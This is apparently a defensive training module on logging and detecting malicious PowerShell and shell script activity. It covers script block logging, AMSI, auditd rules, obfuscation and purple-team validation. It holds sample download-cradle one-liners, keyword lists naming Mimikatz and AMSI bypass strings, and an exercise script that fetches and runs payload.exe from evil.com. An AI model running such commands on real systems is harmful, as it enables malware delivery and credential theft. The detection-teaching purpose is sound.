# Validating Command-Line and Script Activity

## 1. Orientation

### What this module covers
This module covers visibility into command-line interpreters and scripting engines—PowerShell, Bash, Python, and other execution environments attackers love. Script block logging and command auditing are essential for detecting living-off-the-land attacks.

### Fit in the Learning Path
Modern attacks rarely use traditional malware—they abuse built-in scripting languages. If you only see "script ran" without content, you miss 90% of the attack story. Deep script visibility is essential.

### Learning Objectives
By the end of this module, you will:
*   Configure comprehensive script logging
*   Understand AMSI and script block logging
*   Detect obfuscated and malicious scripts
*   Validate script visibility through testing

---

## 2. Core Content

### Mental Model: The Script Visibility Gap

**How professionals think about this:**
Script execution is where attackers live. They avoid dropping binaries and instead use PowerShell, Python, and Bash. Without script content visibility, all you see is "interpreter ran"—useless for detection.

```
THE VISIBILITY HIERARCHY:

LEVEL 1: NO SCRIPT LOGGING (BLIND)
─────────────────────────────
Log: "powershell.exe ran"
Value: Nearly useless
Problem: PowerShell runs constantly

LEVEL 2: COMMAND LINE ONLY (PARTIAL)
─────────────────────────────
Log: "powershell.exe -enc RwBlAHQ..."
Value: Can see encoded command
Problem: Still need to decode

LEVEL 3: SCRIPT BLOCK LOGGING (GOOD)
─────────────────────────────
Log: "Invoke-Mimikatz -DumpCreds"
Value: See actual commands even after decode
Benefit: AMSI de-obfuscates before logging

LEVEL 4: FULL TRANSCRIPTION (BEST)
─────────────────────────────
Log: Complete I/O of session
Value: Full attack narrative
Problem: Volume, may capture credentials

```

### PowerShell Logging Deep Dive

**Critical PowerShell logging options:**

```
POWERSHELL LOGGING CONFIGURATION:

1. SCRIPT BLOCK LOGGING (ESSENTIAL)
   ─────────────────────────────
   Event ID: 4104 (Script Block)
   
   What it captures:
   - De-obfuscated script content
   - Function definitions
   - Commands executed
   
   GPO: Computer Configuration → Admin Templates →
        Windows Components → Windows PowerShell →
        Turn on PowerShell Script Block Logging = Enabled
        
   Registry:
   HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
   EnableScriptBlockLogging = 1
   
   GOLD: Logs the script AFTER de-obfuscation
         Encoded: -enc RwBlAHQALQBQAHIAbwBjAGUAcwBzAA==
         Logged:  Get-Process

2. MODULE LOGGING (HELPFUL)
   ─────────────────────────────
   Event ID: 4103 (Module)
   
   What it captures:
   - Which modules loaded
   - Which commands from modules executed
   
   GPO: Turn on Module Logging = Enabled
        Module Names: * (all modules)

3. TRANSCRIPTION (COMPREHENSIVE)
   ─────────────────────────────
   What it captures:
   - Complete input/output
   - Everything typed and displayed
   
   GPO: Turn on PowerShell Transcription = Enabled
        Include invocation headers
        
   Warning: May capture passwords typed at prompts
            High volume

4. CONSTRAINED LANGUAGE MODE (PREVENTION)
   ─────────────────────────────
   Not logging, but limits PowerShell capability
   Restricts dangerous operations
   Use with AppLocker/WDAC
```

### AMSI (Anti-Malware Scan Interface)

**Windows script scanning integration:**

```
AMSI ARCHITECTURE:

┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│  Script Execution Request                                          │
│  (PowerShell, VBScript, JScript, etc.)                             │
│         │                                                          │
│         ▼                                                          │
│  ┌──────────────────┐                                              │
│  │    AMSI Layer    │──────────────────────────────┐               │
│  │                  │    Provides script content   │               │
│  │  De-obfuscates   │    to security products      │               │
│  │  before scanning │                              │               │
│  └──────────────────┘                              │               │
│         │                                          ▼               │
│         │                                 ┌──────────────┐         │
│         │                                 │   AV/EDR    │         │
│         │                                 │   Engine    │         │
│         │                                 └──────────────┘         │
│         │                                          │               │
│         │◄─────────────── Allow / Block ──────────┘               │
│         ▼                                                          │
│  [Execute or Block]                                                │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘

AMSI COVERAGE:
- PowerShell (v5+)
- Windows Script Host (VBScript, JScript)
- Office VBA macros
- .NET assemblies
- WMI

AMSI BYPASS:
Attackers try to bypass AMSI
Common techniques:
- Memory patching
- Reflection-based disable
- String manipulation

DETECTION:
The BYPASS ATTEMPT often generates logs
Even if bypass succeeds, attempt may be detected
Event ID 4104 often captures bypass code
```

### Linux Script Visibility

**Auditd and beyond:**

```
LINUX SCRIPT LOGGING:

THE PROBLEM WITH BASH HISTORY:
─────────────────────────────
~/.bash_history

Issues:
- User-controllable
- Easily deleted
- Not real-time
- Only interactive sessions
- HISTSIZE can be set to 0

NEVER RELY ON BASH_HISTORY FOR SECURITY

AUDITD (KERNEL-LEVEL AUDITING):
─────────────────────────────
Configuration: /etc/audit/audit.rules

Key rules for script visibility:

# Log all executions
-a always,exit -F arch=b64 -S execve -k exec

# Log shell invocations
-w /bin/bash -p x -k bash_exec
-w /bin/sh -p x -k sh_exec
-w /usr/bin/python -p x -k python_exec
-w /usr/bin/perl -p x -k perl_exec

# Log script files
-w /tmp -p wa -k tmp_writes

View logs: ausearch -k exec

SYSMON FOR LINUX:
─────────────────────────────
Microsoft's Sysmon ported to Linux
Provides Event ID 1 (Process Create)
With command line arguments

OSQUERY:
─────────────────────────────
SQL interface to system state
Can query running processes
Real-time visibility

EDR:
─────────────────────────────
Commercial EDR for Linux
Best visibility option
Behavioral analysis
```

### Obfuscation Detection

**Catching what they hide:**

```
OBFUSCATION TECHNIQUES AND DETECTION:

1. BASE64 ENCODING
   ─────────────────────────────
   Technique: powershell -enc [base64]
   Detection: "-enc" in command line
              Script Block shows decoded
   
2. CONCATENATION
   ─────────────────────────────
   Technique: "Inv"+"oke-Mimi"+"katz"
   Detection: Script Block shows reconstructed
              AMSI sees final string
   
3. VARIABLE SUBSTITUTION
   ─────────────────────────────
   Technique: $a="Mimi"; $b=$a+"katz"; Invoke-$b
   Detection: Script Block logging
              Static: Pattern for assignment chains
   
4. CHARACTER MANIPULATION
   ─────────────────────────────
   Technique: [char]73+[char]69+[char]88
              (IEX = Invoke-Expression)
   Detection: AMSI/Script Block
              "[char]" abundance in command
   
5. COMPRESSION
   ─────────────────────────────
   Technique: Compressed/encoded payload
   Detection: Decompress triggers more logging
              IEX of New-Object IO.StreamReader
   
6. DOWNLOAD CRADLES
   ─────────────────────────────
   Technique: IEX (New-Object Net.WebClient).DownloadString()
   Detection: "DownloadString", "WebClient"
              "Net.WebClient" in Event 4104

DETECTION APPROACH:
─────────────────────────────
Don't try to match obfuscated patterns
Rely on AMSI/Script Block to de-obfuscate
Alert on de-obfuscated malicious content
Also alert on obfuscation indicators:
- Very long commands
- High entropy strings
- Known obfuscation functions
```

### Key Script Detection Rules

**What to alert on:**

```
CRITICAL SCRIPT DETECTIONS:

1. POWERSHELL DOWNLOAD CRADLE
   ─────────────────────────────
   EventID 4104
   ScriptBlock contains:
   - "DownloadString"
   - "DownloadFile"
   - "WebClient"
   - "Net.WebClient"
   - "Invoke-WebRequest"
   - "wget"
   - "curl"
   
2. ENCODED COMMAND EXECUTION
   ─────────────────────────────
   EventID 4688 or Sysmon 1
   CommandLine contains:
   - "-enc"
   - "-e"
   - "-encodedcommand"
   - "-ec"
   
3. INVOKE-EXPRESSION (IEX)
   ─────────────────────────────
   EventID 4104
   ScriptBlock contains:
   - "iex"
   - "invoke-expression"
   Especially with DownloadString
   
4. CREDENTIAL ACCESS
   ─────────────────────────────
   EventID 4104
   ScriptBlock contains:
   - "mimikatz"
   - "sekurlsa"
   - "kerberos::"
   - "Get-Credential"
   - "ConvertTo-SecureString"
   
5. RECONNAISSANCE
   ─────────────────────────────
   EventID 4104
   ScriptBlock contains:
   - "Get-ADUser"
   - "Get-ADComputer"
   - "Get-ADGroup"
   - "net user"
   - "net group"
   - "whoami"
   
6. AMSI BYPASS ATTEMPT
   ─────────────────────────────
   EventID 4104
   ScriptBlock contains:
   - "AmsiUtils"
   - "amsiInitFailed"
   - "SetValue.*True"
```

### Purple Team Validation

**Testing script visibility:**

```
PURPLE TEAM SCRIPT VALIDATION:

TEST 1: BASIC SCRIPT BLOCK
─────────────────────────────
Action: PowerShell "Get-Date"
Check: Does Event 4104 show "Get-Date"?
       Not just "powershell.exe ran"

TEST 2: ENCODED COMMAND
─────────────────────────────
Action: powershell -enc RwBlAHQALQBEAGEAdABlAA==
        (Get-Date in Base64)
Check: Does 4104 show "Get-Date" (decoded)?
       Not just the Base64 blob?

TEST 3: OBFUSCATED COMMAND
─────────────────────────────
Action: $a='Get'; $b='-Date'; iex ($a+$b)
Check: Does Script Block show final command?
       Is obfuscation detected?

TEST 4: DOWNLOAD CRADLE
─────────────────────────────
Action: iex (New-Object Net.WebClient).DownloadString('http://safe-url')
Check: Does detection rule fire?
       Is URL captured?

TEST 5: AMSI BYPASS
─────────────────────────────
Action: Common AMSI bypass technique
Check: Is attempt logged?
       Does bypass detection fire?

TEST 6: LINUX AUDITD
─────────────────────────────
Action: bash -c "curl http://example.com"
Check: Does auditd log show command?
       Is full command line captured?
```

---

## 3. Guided Practice

### Exercise 1: PowerShell Log Analysis

For this Event 4104, what happened?

```
ScriptBlockText:
$wc = New-Object System.Net.WebClient
$wc.DownloadFile('http://evil.com/payload.exe','C:\temp\payload.exe')
Start-Process 'C:\temp\payload.exe'
```

Attack type: ___
Indicators: ___
Response: ___

### Exercise 2: Obfuscation Detection

Which are suspicious? Why?

| Command | Suspicious? | Indicator |
|---------|-------------|-----------|
| `powershell Get-Process` | ___ | ___ |
| `powershell -enc RwBlAHQA...` | ___ | ___ |
| `p^o^w^e^r^s^h^e^l^l` | ___ | ___ |
| `iex (iwr http://...)` | ___ | ___ |

### Exercise 3: Visibility Audit

Check your environment:

| Logging Type | Enabled | SIEM Integration | Detection Rules |
|--------------|---------|------------------|-----------------|
| PowerShell 4104 | ___ | ___ | ___ |
| PowerShell 4103 | ___ | ___ | ___ |
| Linux auditd | ___ | ___ | ___ |

---

## 4. Reflection Check

### Script Understanding
1. PowerShell Transcription captures passwords. Worth the risk?

2. AMSI bypassed. Still logged?

3. Bash history empty on compromised system. Alternative evidence?

### Strategic Thinking
1. Event 4104 generates 5GB/day. Storage vs visibility trade-off?

2. Developers need PowerShell. Block or monitor?

3. Script content logged but never reviewed. Value?

---

## 5. Key Misconceptions

**MYTH: "Encoded commands hide from logging"**
REALITY: Script Block Logging shows decoded content thanks to AMSI.

**MYTH: "Bash history is a security log"**
REALITY: Bash history is user-controllable and easily deleted. Use auditd.

**MYTH: "If AMSI is bypassed, we're blind"**
REALITY: Bypass attempts often generate logs. Multiple detection layers help.

**MYTH: "We log process creation, that's enough"**
REALITY: Process creation without script content misses the actual attack.

**MYTH: "Obfuscation defeats detection"**
REALITY: AMSI de-obfuscates. Also, obfuscation itself is suspicious.

---

## 6. Completion Criteria

This module is complete when you can:

1. **Configure** PowerShell Script Block Logging
2. **Understand** AMSI and its role in detection
3. **Detect** obfuscated and malicious scripts
4. **Implement** Linux script logging (auditd)
5. **Validate** script visibility through testing

---

## 7. Further Depth (Optional)

*   **Tool:** PowerShell Script Block Logging analyzer
*   **Resource:** AMSI bypass research and detection
*   **Practice:** Build download cradle detection rule
*   **Reading:** Linux auditd configuration guides
